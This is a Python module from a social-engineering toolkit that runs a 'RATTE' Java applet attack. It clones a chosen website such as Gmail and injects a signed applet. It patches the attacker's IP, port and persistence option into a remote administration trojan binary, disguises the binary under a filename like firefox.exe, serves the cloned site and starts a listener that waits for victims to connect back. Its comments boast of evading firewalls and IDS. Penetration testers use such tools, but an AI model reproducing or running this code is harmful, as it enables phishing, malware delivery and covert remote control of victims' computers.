#!/usr/bin/env python
#
# These are required fields
#
import os
import subprocess
from time import sleep

try:
    from urllib.parse import urlparse
except ImportError:
    from urlparse import urlparse

try:
    import socketserver as SocketServer  # Py3
except ImportError:
    import SocketServer  # Py2

try:
    import http.server as SimpleHTTPServer  # Py3
except ImportError:
    import SimpleHTTPServer  # Py2

try:
    import _thread as thread  # Py3
except ImportError:
    import thread  # Py2

import src.core.setcore as core
from src.core.menu import text

try:
    input = raw_input
except NameError:
    pass

definepath = os.getcwd()
userconfigpath = core.userconfigpath

MAIN="RATTE Java Applet Attack (Remote Administration Tool Tommy Edition) - Read the readme/RATTE_README.txt first"

# This is RATTE (Remote Administration Tool Tommy Edition) attack module. It will launch a java applet attack to inject RATTE. Then it will launch RATTE-Server and wait for victim to connect. RATTE can beat local Firewalls, IDS and even EAL 4+ certified network firewalls.
# This release one is only for education!"
AUTHOR="Thomas Werth"

httpd = None


#
# This will start a web server in the directory root you specify, so for example
# you clone a website then run it in that web server, it will pull any index.html file
#
def start_web_server_tw(directory, port):
    global httpd
    try:
        # create the httpd handler for the simplehttpserver
        # we set the allow_reuse_address in case something hangs can still bind to port

        class ReusableTCPServer(SocketServer.TCPServer):
            allow_reuse_address = True

        # specify the httpd service on 0.0.0.0 (all interfaces) on port 80
        httpd = ReusableTCPServer(("0.0.0.0", port), SimpleHTTPServer.SimpleHTTPRequestHandler)
        # thread this mofo
        thread.start_new_thread(httpd.serve_forever, ())
        # change directory to the path we specify for output path
        os.chdir(directory)

    # handle keyboard interrupts
    except KeyboardInterrupt:
        core.print_info("Exiting the SET web server...")
        httpd.socket.close()

        # handle the rest
        # except Exception:
        #    print "[*] Exiting the SET web server...\n"
        #    httpd.socket.close()


def stop_web_server_tw():
    global httpd
    try:
        httpd.socket.close()
    # handle the exception
    except:
        httpd.socket.close()


#
# This will create the java applet attack from start to finish.
# Includes payload (reverse_meterpreter for now) cloning website
# and additional capabilities.
#
def java_applet_attack_tw(website, port, directory, ipaddr):
    # clone the website and inject java applet
    core.site_cloner(website, directory, "java")

    ############################################
    # use customized Ratte nehmen
    ############################################

    # this part is needed to rename the msf.exe file to a randomly generated one
    if os.path.isfile(os.path.join(userconfigpath, "rand_gen")):
        # open the file
        # start a loop
        with open(os.path.join(userconfigpath, "rand_gen")) as fileopen:
            for line in fileopen:
                # define executable name and rename it
                filename = line.rstrip()
                # move the file to the specified directory and filename
                subprocess.Popen("cp src/payloads/ratte/ratte.binary %s/%s 1> /dev/null 2> /dev/null" % (directory, filename), shell=True).wait()

    # lastly we need to copy over the signed applet
    subprocess.Popen("cp %s/Signed_Update.jar %s 1> /dev/null 2> /dev/null" % (userconfigpath, directory), shell=True).wait()

    # TODO index.html parsen und IPADDR:Port ersetzen
    with open(os.path.join(directory, "index.html"), "rb") as fileopen:
        data = fileopen.read()

    with open(os.path.join(directory, "index.html"), 'wb') as filewrite:
        to_replace = core.grab_ipaddress() + ":80"

        # replace 3 times
        filewrite.write(data.replace(str(to_replace), ipaddr + ":" + str(port), 3))

    # start the web server by running it in the background
    start_web_server_tw(directory, port)


#
# Start ratteserver
#
def ratte_listener_start(port):
    # launch ratteserver    using ../ cause of reports/ subdir
    # subprocess.Popen("%s/src/set_payloads/ratte/ratteserver %d" % (os.getcwd(),port), shell=True).wait()
    subprocess.Popen("../src/payloads/ratte/ratteserver %d" % port, shell=True).wait()


def prepare_ratte(ipaddr, ratteport, persistent, customexe):
    core.print_status("preparing RATTE...")
    # replace ipaddress with one that we need for reverse connection back
    ############
    # Load content of RATTE
    ############
    with open("src/payloads/ratte/ratte.binary", "rb") as fileopen:
        data = fileopen.read()

    ############
    # PATCH Server IP into RATTE
    ############
    with open(os.path.join(userconfigpath, "ratteM.exe"), 'wb') as filewrite:

        host = (len(ipaddr) + 1) * "X"
        r_port = (len(str(ratteport)) + 1) * "Y"
        pers = (len(str(persistent)) + 1) * "Z"
        # check ob cexe > 0, sonst wird ein Feld gepatcht (falsch!)
        if customexe:
            cexe = (len(str(customexe)) + 1) * "Q"
        else:
            cexe = ""

        filewrite.write(data.replace(cexe, customexe + "\x00", 1).replace(pers, persistent + "\x00", 1).replace(host, ipaddr + "\x00", 1).replace(r_port, str(ratteport) + "\x00", 1))


# def main(): header is required
def main():
    valid_site = False
    valid_ip = False
    # valid_persistence = False
    input_counter = 0
    site_input_counter = 0
    ipaddr = None
    website = None

    # pause=input("This module has finished completing. Press <enter> to continue")

    # Get a *VALID* website address
    while not valid_site and site_input_counter < 3:
        website = input(core.setprompt(["9", "2"], "Enter website to clone (ex. https://gmail.com)"))
        site = urlparse(website)

        if site.scheme == "http" or site.scheme == "https":
            if site.netloc != "":
                valid_site = True
            else:
                if site_input_counter == 2:
                    core.print_error("\nMaybe you have the address written down wrong?" + core.bcolors.ENDC)
                    sleep(4)
                    return
                else:
                    core.print_warning("I can't determine the fqdn or IP of the site. Try again?")
                    site_input_counter += 1
        else:
            if site_input_counter == 2:
                core.print_error("\nMaybe you have the address written down wrong?")
                sleep(4)
                return
            else:
                core.print_warning("I couldn't determine whether this is an http or https site. Try again?")
                site_input_counter += 1
                # core.DebugInfo("site.scheme is: %s " % site.scheme)
                # core.DebugInfo("site.netloc is: %s " % site.netloc)
                # core.DebugInfo("site.path is: %s " % site.path)
                # core.DebugInfo("site.params are: %s " % site.params)
                # core.DebugInfo("site.query is: %s " % site.query)
                # core.DebugInfo("site.fragment is: %s " % site.fragment)

    while not valid_ip and input_counter < 3:
        ipaddr = input(core.setprompt(["9", "2"], "Enter the IP address to connect back on"))
        valid_ip = core.validate_ip(ipaddr)
        if not valid_ip:
            if input_counter == 2:
                core.print_error("\nMaybe you have the address written down wrong?")
                sleep(4)
                return
            else:
                input_counter += 1

    # javaport must be 80, cause applet uses in web injection port 80 to download payload!
    try:
        javaport = int(input(core.setprompt(["9", "2"], "Port Java applet should listen on [80]")))
        while javaport == 0 or javaport > 65535:
            if javaport == 0:
                core.print_warning(text.PORT_NOT_ZERO)
            if javaport > 65535:
                core.print_warning(text.PORT_TOO_HIGH)
            javaport = int(input(core.setprompt(["9", "2"], "Port Java applet should listen on [80]")))
    except ValueError:
        # core.print_info("Port set to default of 80")
        javaport = 80

    try:
        ratteport = int(input(core.setprompt(["9", "2"], "Port RATTE Server should listen on [8080]")))
        while ratteport == javaport or ratteport == 0 or ratteport > 65535:
            if ratteport == javaport:
                core.print_warning("Port must not be equal to javaport!")
            if ratteport == 0:
                core.print_warning(text.PORT_NOT_ZERO)
            if ratteport > 65535:
                core.print_warning(text.PORT_TOO_HIGH)
            ratteport = int(input(core.setprompt(["9", "2"], "Port RATTE Server should listen on [8080]")))
    except ValueError:
        ratteport = 8080

    persistent = core.yesno_prompt(["9", "2"], "Should RATTE be persistentententent [no|yes]?")

    # j0fer 06-27-2012 #        while valid_persistence != True:
    # j0fer 06-27-2012 #                persistent=input(core.setprompt(["9", "2"], "Should RATTE be persistent [no|yes]?"))
    # j0fer 06-27-2012 #                persistent=str.lower(persistent)
    # j0fer 06-27-2012 #                if persistent == "no" or persistent == "n":
    # j0fer 06-27-2012 #                        persistent="NO"
    # j0fer 06-27-2012 #                        valid_persistence = True
    # j0fer 06-27-2012 #               elif persistent == "yes" or persistent == "y":
    # j0fer 06-27-2012 #                       persistent="YES"
    # j0fer 06-27-2012 #                       valid_persistence = True
    # j0fer 06-27-2012 #                else:
    # j0fer 06-27-2012 #                       core.print_warning(text.YES_NO_RESPONSES)

    customexe = input(core.setprompt(["9", "2"], "Use specifix filename (ex. firefox.exe) [filename.exe or empty]?"))

    #######################################
    # prepare RATTE
    #######################################

    prepare_ratte(ipaddr, ratteport, persistent, customexe)

    ######################################
    # Java Applet Attack to deploy RATTE
    #######################################

    core.print_info("Starting java applet attack...")
    java_applet_attack_tw(website, javaport, "reports/", ipaddr)

    with open(os.path.join(userconfigpath, definepath, "/rand_gen")) as fileopen:
        for line in fileopen:
            ratte_random = line.rstrip()
        subprocess.Popen("cp %s/ratteM.exe %s/reports/%s" % (os.path.join(userconfigpath, definepath), definepath, ratte_random), shell=True).wait()

    #######################
    # start ratteserver
    #######################

    core.print_info("Starting ratteserver...")
    ratte_listener_start(ratteport)

    ######################
    # stop webserver
    ######################
    stop_web_server_tw()
    return
